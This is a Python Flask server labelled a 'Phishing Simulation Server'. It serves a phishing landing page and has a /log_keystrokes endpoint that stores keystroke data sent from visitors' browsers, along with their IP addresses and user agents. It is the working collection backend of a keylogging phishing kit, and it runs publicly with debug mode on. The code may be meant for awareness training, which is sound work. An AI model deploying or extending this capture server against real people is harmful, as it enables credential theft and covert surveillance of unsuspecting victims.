#!/usr/bin/env python3
from flask import Flask, request, jsonify, send_from_directory, send_file
import json
from datetime import datetime
import os
import subprocess
import platform
from pathlib import Path

# Get the project root directory
PROJECT_ROOT = Path(__file__).parent

app = Flask(__name__)

# Directory for storing keyboard logs
LOG_DIR = PROJECT_ROOT / "keyboard_logs"
LOG_DIR.mkdir(exist_ok=True)

def is_kali_linux():
    """Check if running on Kali Linux"""
    try:
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                return 'kali' in content
        return False
    except:
        return False

def get_file_path(filename):
    """Get file path, checking both Inbox and project root"""
    # First check Inbox folder
    inbox_path = PROJECT_ROOT / 'Inbox' / filename
    if inbox_path.exists():
        return inbox_path
    
    # Then check project root
    root_path = PROJECT_ROOT / filename
    if root_path.exists():
        return root_path
    
    # File not found
    return None

@app.route('/')
def serve_landing_page():
    """Serve the main landing page"""
    file_path = get_file_path('Landing-Page.html')
    if file_path:
        return send_file(str(file_path))
    return "Landing page not found", 404

@app.route('/log_keystrokes', methods=['POST'])
def log_keystrokes():
    """Endpoint to receive keyboard event data"""
    try:
        if not is_kali_linux():
            return jsonify({"error": "This endpoint is only available on Kali Linux"}), 403
        
        data = request.json
        if not data:
            return jsonify({"error": "No data provided"}), 400
        
        data['server_timestamp'] = datetime.now().isoformat()
        data['client_ip'] = request.remote_addr
        data['user_agent'] = request.headers.get('User-Agent', 'Unknown')
        
        session_id = data.get('session_id', 'unknown_session')
        safe_session_id = ''.join(c for c in session_id if c.isalnum() or c in '_-')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = LOG_DIR / f"keystrokes_{safe_session_id}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"Keystrokes logged: {session_id} from {data['client_ip']} - {data.get('total_events', 0)} events")
        
        return jsonify({"status": "success", "message": "Keystrokes logged", "filename": str(filename)})
    
    except Exception as e:
        print(f"Error logging keystrokes: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/css/<path:filename>')
def serve_css(filename):
    """Serve CSS files from Inbox/css or create minimal CSS"""
    css_path = PROJECT_ROOT / 'Inbox' / 'css' / filename
    
    # If CSS doesn't exist in Inbox, check project root
    if not css_path.exists():
        root_css = PROJECT_ROOT / filename
        if root_css.exists():
            return send_file(str(root_css))
        
        # Create minimal CSS if it doesn't exist
        css_path.parent.mkdir(parents=True, exist_ok=True)
        minimal_css = "/* Minimal CSS for simulation */\nbody { font-family: Arial; }"
        css_path.write_text(minimal_css)
    
    return send_file(str(css_path))

@app.route('/<path:filename>')
def serve_inbox_files(filename):
    """Serve files from Inbox directory or project root"""
    # Security check - only allow certain files
    allowed_extensions = {'.html', '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico'}
    file_path = Path(filename)
    
    if file_path.suffix not in allowed_extensions:
        return "Forbidden", 403
    
    # Try Inbox first
    inbox_path = PROJECT_ROOT / 'Inbox' / filename
    if inbox_path.exists():
        return send_file(str(inbox_path))
    
    # Try project root
    root_path = PROJECT_ROOT / filename
    if root_path.exists():
        return send_file(str(root_path))
    
    return "File not found", 404

if __name__ == '__main__':
    print("=" * 60)
    print("Phishing Simulation Server")
    print(f"Running on Kali Linux: {is_kali_linux()}")
    print(f"Project root: {PROJECT_ROOT}")
    print(f"Server starting on http://localhost:8080")
    print("=" * 60)
    
    # Check if Landing-Page.html exists anywhere
    landing_page_path = get_file_path('Landing-Page.html')
    if landing_page_path:
        print(f"Found landing page at: {landing_page_path}")
    else:
        print("WARNING: Landing-Page.html not found in Inbox or project root")
        print("The server will run but may return 404 errors")
    
    app.run(host='0.0.0.0', port=8080, debug=True)